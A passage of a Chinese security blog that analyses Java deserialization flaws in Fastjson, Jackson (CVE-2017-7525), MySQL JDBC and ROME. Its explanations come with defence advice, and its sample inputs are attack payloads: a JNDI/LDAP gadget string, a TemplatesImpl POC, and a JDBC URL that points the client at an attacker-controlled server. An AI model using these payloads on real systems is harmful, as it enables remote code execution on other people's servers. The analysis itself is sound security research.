<p>在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测。</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存Map了。同时将Class类加入到了黑名单中。</p>
<h2 id="1-2-62绕过"><a href="#1-2-62绕过" class="headerlink" title="1.2.62绕过"></a>1.2.62绕过</h2><p>新Gadget绕过黑名单限制。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>



<p>org.apache.xbean.propertyeditor.JndiConverter类的toObjectImpl()函数存在JNDI注入漏洞，可由其构造函数处触发利用。</p>
<p>前提条件</p>
<ul>
<li>需要开启AutoType；</li>
<li>Fastjson &lt;&#x3D; 1.2.62；</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>目标服务端需要存在xbean-reflect包；</li>
</ul>
<p>参考链接：<a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">http://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm5l7vlhr0005fscx88esb7ji" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Fastjson反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Jackson反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Jackson反序列化</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="使用Jackson进行序列化和反序列化"><a href="#使用Jackson进行序列化和反序列化" class="headerlink" title="使用Jackson进行序列化和反序列化"></a>使用Jackson进行序列化和反序列化</h2><p>Jackson提供了ObjectMapper.writeValueAsString()和ObjectMapper.readValue()两个方法来实现序列化和反序列化的功能。</p>
<p>我本地测试用到的jar包：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9</p>
<p>定义Person类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s&quot;</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>JSTest.java：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line">Person.age=<span class="number">6</span>, Person.name=a</span><br></pre></td></tr></table></figure>

<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>简单地说，Java多态就是同一个接口使用不同的实例而执行不同的操作。</p>
<p>那么问题来了，如果对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例呢？——Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。</p>
<p>JacksonPolymorphicDeserialization即Jackson多态类型的反序列化：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如Object、接口或抽象类，则可以在JSON字符串中指定其具体类型，Jackson将生成具体类型的实例。</p>
<p>简单地说，就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种，即DefaultTyping和@JsonTypeInfo注解。</p>
<h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>DefaultTyping是一个枚举类，有四个值。</p>
<p>JAVA_LANG_OBJECT，OBJECT_AND_NON_CONCRETE，NON_FINAL</p>
<p>JAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为一个A类型时，会对该A类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个A本身也得是一个可被序列化的类）</p>
<p>OBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有Interface、AbstractClass类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。此外，enableDefaultTyping()默认的无参数的设置就是此选项。</p>
<p>NON_CONCRETE_AND_ARRAYS：除了前面提到的特征外，还支持Array类型。</p>
<p>NON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>从前面的分析知道，DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表：</p>
<table>
<thead>
<tr>
<th align="left"><strong><font style="color:rgb(32, 32, 32);">DefaultTyping类型</font></strong></th>
<th align="left"><strong><font style="color:rgb(32, 32, 32);">描述说明</font></strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><font style="color:rgb(32, 32, 32);">JAVA_LANG_OBJECT</font></td>
<td align="left"><font style="color:rgb(32, 32, 32);">属性的类型为Object</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(32, 32, 32);">OBJECT_AND_NON_CONCRETE</font></td>
<td align="left"><font style="color:rgb(32, 32, 32);">属性的类型为Object、Interface、AbstractClass</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(32, 32, 32);">NON_CONCRETE_AND_ARRAYS</font></td>
<td align="left"><font style="color:rgb(32, 32, 32);">属性的类型为Object、Interface、AbstractClass、Array</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(32, 32, 32);">NON_FINAL</font></td>
<td align="left"><font style="color:rgb(32, 32, 32);">所有除了声明为final之外的属性</font></td>
</tr>
</tbody></table>
<p>@JsonTypeInfo注解</p>
<p>@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)</span><br></pre></td></tr></table></figure>



<p>当@JsonTypeInfo注解设置为如下值之一并且修饰的是Object类型的属性时，可以利用来触发Jackson反序列化漏洞：</p>
<ul>
<li>JsonTypeInfo.Id.CLASS</li>
<li>JsonTypeInfo.Id.MINIMAL_CLASS</li>
</ul>
<h2 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h2><p>Jackson反序列化的过程其实就分为两步，第一步是通过构造函数生成实例，第二部是设置实例的属性值。</p>
<p>BeanDeserializer.vanillaDeserialize()函数调用完无参的类的构造函数生成实例Bean后，就开始进入do while循环来循环解析键值对中的属性值并调用deserializeAndSet()函数来解析并设置Bean的属性值。</p>
<p>反序列化属性时的两个代码逻辑，其中if判断语句会判断当前反序列化的内容是否携带类型，若是则调用deserializeWithType()函数解析，否则直接调用deserialize()函数解析。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>由之前的结论知道，当使用的JacksonPolymorphicDeserialization机制配置有问题时，Jackson反序列化就会调用属性所属类A的构造函数和setter方法。</p>
<p>而如果该构造函数或setter方法存在危险操作，那么就存在Jackson反序列化漏洞。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在Jackson反序列化中，若 或使用@JsonTypeInfo注解指定反序列化得到的类的属性为JsonTypeInfo.Id.CLASS或JsonTypeInfo.Id.MINIMAL_CLASS，则会为对象添加类型信息，调用该属性的类的构造函数和setter方法。</p>
<h2 id="CVE-2017-7525（基于TemplatesImpl利用链）"><a href="#CVE-2017-7525（基于TemplatesImpl利用链）" class="headerlink" title="CVE-2017-7525（基于TemplatesImpl利用链）"></a>CVE-2017-7525（基于TemplatesImpl利用链）</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Jackson 2.6系列 &lt; 2.6.7.1</p>
<p>Jackson 2.7系列 &lt; 2.7.9.1</p>
<p>Jackson 2.8系列 &lt; 2.8.8.1</p>
<h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>JDK使用1.7版本的，不能使用1.8版本，具体原因后面章节会分析到。</p>
<p>注意，小版本搞的1.7版本的也会有些不能成功利用，具体要自己测试才知道哪些版本是可用的。</p>
<p>我本地用的JDK版本为1.7.0_21，之前用的1.7.0_80没成功。</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;transletBytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;transletName&quot;</span><span class="punctuation">:</span><span class="string">&quot;mi1k7ea&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;outputProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>transletBytecodes——Base64编码的Exploit恶意类的字节流</li>
<li>transletName——TemplatesImpl类对象的_name属性值；</li>
<li>outputProperties——为的是能够成功调用setOutputProperties()函数，该函数是outputProperties属性的setter方法，在Jackson反序列化时会被自动调用；</li>
</ul>
<p>前两个属性transletBytecodes和transletName都是通过反射机制调用setter方法设置的，但是outputProperties属性在deserializeAndSet()函数中是通过反射机制调用它的getter方法，这就是该利用链能被成功触发的原因。</p>
<h3 id="利用链："><a href="#利用链：" class="headerlink" title="利用链："></a>利用链：</h3><p>getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()-&gt;恶意类构造函数</p>
<h3 id="为什么会触发getOutputproperties"><a href="#为什么会触发getOutputproperties" class="headerlink" title="为什么会触发getOutputproperties"></a>为什么会触发getOutputproperties</h3><p>在com.fasterxml.jackson.databind.deser.BeanDeserializer#vanillaDeserialize中，会根据属性名从this._beanProperties寻找对应的调用方法</p>
<p><img src="https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Jackson%E7%9A%84%E5%88%A9%E7%94%A8%E8%A7%A6%E5%8F%91/img/1.png?raw=true"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732534909785-121dce79-d414-4620-b198-5a2844cfd47f.png"></p>
<p>这里长话短说，在com.fasterxml.jackson.databind.deser.BeanDeserializerFactory#addBeanProps当中，可以很清楚的看出大概逻辑</p>
<p>首先看看有无set方法</p>
<p>如果没有set方法则看看有无这个字段，后面通过反射复制</p>
<p>如果没有set方法以及字段，则会去寻找get方法（前提返回值是Collection、Map及其子类）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732534955029-27d880f7-10ab-4731-90c2-abb03b27e574.png"></p>
<p>这里很清楚就能知道为何能触发getOutputproperties，没有setOutputproperties,也没有outputproperties这个字段，并且getOutputproperties返回是Properties(继承Map类)</p>
<h2 id="检测与防御"><a href="#检测与防御" class="headerlink" title="检测与防御"></a>检测与防御</h2><h3 id="检查方法"><a href="#检查方法" class="headerlink" title="检查方法"></a>检查方法</h3><p>检查是否使用到了Jackson，并且版本号是否是漏洞版本，若是则排查是否存在ObjectMapper.readValue，同时排查是否开启了DefaultTyping或使用了设置有问题的@JsonTypeInfo注解。</p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>升级到最新版的Jackson；</p>
<p>禁用enableDefaultTyping()；</p>
<p>禁用@JsonTypeInfo注解，或严格限制只能使用值为JsonTypeInfo.Id.NONE或JsonTypeInfo.Id.NAME的注解；</p>
<p>避免使用Object作为Jackson反序列化的类型；</p>
<p>链接：</p>
<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/11/24/Jackson%E7%B3%BB%E5%88%97%E4%B8%83%E2%80%94%E2%80%94%E5%85%B6%E4%BB%96Gadgets/">http://www.mi1k7ea.com/2019/11/24/Jackson%E7%B3%BB%E5%88%97%E4%B8%83%E2%80%94%E2%80%94%E5%85%B6%E4%BB%96Gadgets/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm5l7vlhs0006fscxhcff2rvg" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Jackson反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-MySQL JDBC 反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/07/MySQL%20JDBC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/07/MySQL%20JDBC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\MySQL JDBC 反序列化</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="JDBC简介"><a href="#JDBC简介" class="headerlink" title="JDBC简介"></a>JDBC简介</h3><p>JDBC（Java DataBase Connectivity）是Java和数据库之间的一个桥梁，是一个 规范 而不是一个实现，能够执行SQL语句。它由一组用Java语言编写的类和接口组成。各种不同类型的数据库都有相应的实现。</p>
<h3 id="JDBC-Connection-URL攻击"><a href="#JDBC-Connection-URL攻击" class="headerlink" title="JDBC Connection URL攻击"></a>JDBC Connection URL攻击</h3><p>如果我们可以控制JDBC URI就可将JDBC连接地址指向攻击者事先准备好的恶意服务器，这个服务器可以返回恶意的序列化数据。</p>
<p>指定autoDeserialize参数为true后MySQL客户端就可以自动反序列化恶意Payload</p>
<p>使用ServerStatusDiffInterceptor触发客户端和服务端的交互和反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>





<h3 id="反序列化链"><a href="#反序列化链" class="headerlink" title="反序列化链"></a>反序列化链</h3><p>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()方法中有一个可以readObject的地方。</p>
<p>找调用 getObject的地方了，找到了</p>
<p>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()方法。</p>
<p>ServerStatusDiffInterceptor是一个拦截器，在JDBC URL中设定属性queryInterceptors为ServerStatusDiffInterceptor时，执行查询语句会调用拦截器的preProcess和postProcess方法，进而通过上述调用链最终调用getObject()方法。</p>
<p>设置连接中queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize&#x3D;true即可。</p>
<h3 id="假的MYSQL服务"><a href="#假的MYSQL服务" class="headerlink" title="假的MYSQL服务"></a>假的MYSQL服务</h3><p>在JDBC连接MySQL的过程中，执行了SHOW SESSION STATUS语句.我们返回的结果需要是一个恶意的对象.那就是说我们需要自己写一个假的MYSQL服务.</p>
<p>来源：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/07/MySQL%20JDBC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm5l7vlhs0007fscx5vwjgqzj" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\MySQL JDBC 反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ROME反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/07/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/07/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\ROME反序列化</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="ROME简介"><a href="#ROME简介" class="headerlink" title="ROME简介"></a>ROME简介</h2><p>ROME是一个有用的工具库，帮助处理和操作XML格式的数据。ROME库允许我们把XML数据转换成Java中的对象，这样我们可以更方便地在程序中操作数据。另外，它也支持将Java对象转换成XML数据，这样我们就可以把数据保存成XML文件或者发送给其他系统。</p>
<p>maven依赖</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.0</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>



<p>Rome 链也有多个变形。</p>
<h2 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h2><p>一个核心类是 ToStringBean，这个类的 toString 方法会调用他封装类的全部无参 getter 方法。</p>
<p>所以可以借助 JdbcRowSetImpl#getDatabaseMetaData() 方法触发 JNDI 注入。</p>
<p>或者TemplatesImpl.getOutputProperties()方法触发恶意代码执行。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732246562012-9a464ac4-9d03-4d5c-8d05-1a18a2910528.png"></p>
<p><strong>ToStringBean</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ToStringBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SomeClass.class, someInstance);</span><br></pre></td></tr></table></figure>

<p>someInstance 的类型是 <code>SomeClass</code> 或其子类。</p>
<p>toString() 方法是通过 反射调用目标类<code>SomeClass</code> 的全部无参 getter 方法 </p>
<h1 id="（一）ObjectBean-和-EqualsBean"><a href="#（一）ObjectBean-和-EqualsBean" class="headerlink" title="（一）ObjectBean 和 EqualsBean"></a>（一）ObjectBean 和 EqualsBean</h1><h2 id="EqualsBean"><a href="#EqualsBean" class="headerlink" title="EqualsBean"></a>EqualsBean</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(SomeClass.class, obj);</span><br></pre></td></tr></table></figure>

<p><strong>EqualsBean的hashCode()方法会触发其成员变量obj的toString()方法</strong></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732247755101-6b0fb13a-ee16-43b5-9f31-d37f0bfc4e98.png"></p>
<h2 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a><font style="color:rgb(94, 102, 135);">ObjectBean</font></h2><p><font style="color:rgb(82, 95, 127);">在</font><code>&lt;font style=&quot;color:rgb(94, 102, 135);&quot;&gt;ObjectBean.hashcode()&lt;/font&gt;</code><font style="color:rgb(82, 95, 127);">中调用了</font><code>&lt;font style=&quot;color:rgb(94, 102, 135);&quot;&gt;EqualsBean.beanHashCode()&lt;/font&gt;</code><font style="color:rgb(82, 95, 127);">，其作用和</font><code>&lt;font style=&quot;color:rgb(94, 102, 135);&quot;&gt;EqualsBean.hashCode()&lt;/font&gt;</code><font style="color:rgb(82, 95, 127);">等价。因此可以用来替换</font><strong>EqualsBean。</strong></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732257358599-eb039e8c-a13d-40cc-be06-6a341d12bbce.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732257329498-1b14dcb8-f9ad-477a-9442-e8f91d72da2c.png"></p>
<hr>
<hr>
<hr>
<h2 id="HashMap-EqualsBean-ToStringBean-TemplatesImpl"><a href="#HashMap-EqualsBean-ToStringBean-TemplatesImpl" class="headerlink" title="HashMap+EqualsBean+ToStringBean+TemplatesImpl"></a>HashMap+EqualsBean+ToStringBean+TemplatesImpl</h2><p>Payload</p>
